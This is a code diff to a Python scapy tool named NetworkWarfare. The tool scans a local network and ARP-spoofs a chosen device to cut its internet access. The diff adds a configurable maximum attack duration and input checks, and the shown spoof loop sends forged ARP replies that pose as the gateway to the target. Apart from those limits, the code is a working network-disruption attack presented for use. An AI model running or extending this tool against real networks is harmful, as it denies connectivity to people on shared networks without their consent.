@@ -1,8 +1,6 @@
-
 from scapy.all import ARP, Ether, srp, send, conf
-import time
-import socket
 import threading
+import time
 
 # Attempt to use Npcap if available on Windows
 try:
@@ -15,6 +13,8 @@ class NetworkWarfare:
         self.target_ip = None
         self.gateway_ip = None
         self.stop_attack = False
+        self.attack_started_at = 0.0
+        self.max_duration_seconds = 300
 
     def scan_network(self, ip_range="192.168.1.0/24"):
         """
@@ -52,7 +52,7 @@ class NetworkWarfare:
              return "Raspberry Pi"
         return "Unknown"
 
-    def start_blocker(self, target_ip, gateway_ip):
+    def start_blocker(self, target_ip, gateway_ip, max_duration_seconds=300):
         """
         Starts ARP Spoofing to block internet access for target.
         """
@@ -60,10 +60,18 @@ class NetworkWarfare:
             raise ValueError("Target IP and gateway IP must differ")
         if target_ip in ("127.0.0.1", "0.0.0.0", "::1"):
             raise ValueError("Cannot target localhost")
+        try:
+            duration = int(max_duration_seconds)
+        except (TypeError, ValueError) as exc:
+            raise ValueError("max_duration_seconds must be an integer") from exc
+        if duration < 5 or duration > 3600:
+            raise ValueError("max_duration_seconds must be between 5 and 3600")
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.stop_attack = False
-        
+        self.max_duration_seconds = duration
+        self.attack_started_at = time.time()
+
         # Start in thread
         t = threading.Thread(target=self._spoof_loop)
         t.daemon = True
@@ -87,6 +95,9 @@ class NetworkWarfare:
                 return
 
             while not self.stop_attack:
+                if time.time() - self.attack_started_at >= self.max_duration_seconds:
+                    self.stop_attack = True
+                    break
                 # Tell Target I am Gateway
                 send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=target_mac), verbose=False)
                 # Tell Gateway I am Target
